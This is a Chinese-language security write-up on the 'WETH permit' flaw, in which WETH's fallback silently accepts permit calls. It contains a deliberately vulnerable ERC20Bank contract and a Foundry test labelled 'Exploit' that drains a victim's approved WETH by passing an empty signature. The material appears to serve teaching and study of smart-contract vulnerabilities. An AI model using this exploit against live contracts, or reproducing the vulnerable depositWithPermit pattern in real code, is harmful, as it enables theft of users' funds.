# WETH Permit

## 弱点

大部分ERC20合约有`Permit`函数来提供spender的签名检测。

但是`WETH`合约并没有。而当调用`WETH`的`permit`函数的时候，这个过程并不会发生任何错误。因为`fallback`函数的存在，当调用`permit`函数的时候，WETH会直接调用`fallback`函数。



## 例子

1.Alice对ERC20Bank给予无限授权以支出WETH

2.Alice调用deposit，存入1个WETH到ERC20Bank

3.攻击者调用depositWithPermit，传递一个空的签名并将所有来自Alice的代币转入ERC20Bank，将存款记入攻击者名下。

4.攻击者提取所有记在他名下的代币。



## 相关合约代码

**ERC20Bank**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./IERC20Permit.sol";

contract ERC20Bank {
    IERC20Permit public immutable token;
    mapping(address => uint256) public balanceOf;

    constructor(address _token) {
        token = IERC20Permit(_token);
    }

    function deposit(uint256 _amount) external {
        token.transferFrom(msg.sender, address(this), _amount);
        balanceOf[msg.sender] += _amount;
    }

    function depositWithPermit(
        address owner,
        address recipient,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        token.permit(owner, address(this), amount, deadline, v, r, s);
        token.transferFrom(owner, address(this), amount);
        balanceOf[recipient] += amount;
    }

    function withdraw(uint256 _amount) external {
        balanceOf[msg.sender] -= _amount;
        token.transfer(msg.sender, _amount);
    }
}

```



**Exploit**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {WETH} from "../../../src/hacks/weth-permit/WETH.sol";
import {ERC20Bank} from "../../../src/hacks/weth-permit/ERC20Bank.sol";

contract ERC20BankExploitTest is Test {
    WETH private weth;
    ERC20Bank private bank;
    address private constant user = address(11);
    address private constant attacker = address(12);

    function setUp() public {
        weth = new WETH();
        bank = new ERC20Bank(address(weth));

        deal(user, 100 * 1e18);
        vm.startPrank(user);
        weth.deposit{value: 100 * 1e18}();
        weth.approve(address(bank), type(uint256).max);
        bank.deposit(1e18);
        vm.stopPrank();
    }

    function test() public {
        uint256 bal = weth.balanceOf(user);
        vm.startPrank(attacker);
        bank.depositWithPermit(user, attacker, bal, 0, 0, "", "");
        bank.withdraw(bal);
        vm.stopPrank();

        assertEq(weth.balanceOf(user), 0, "WETH balance of user");
        assertEq(
            weth.balanceOf(address(attacker)),
            99 * 1e18,
            "WETH balance of attacker"
        );
    }
}

```

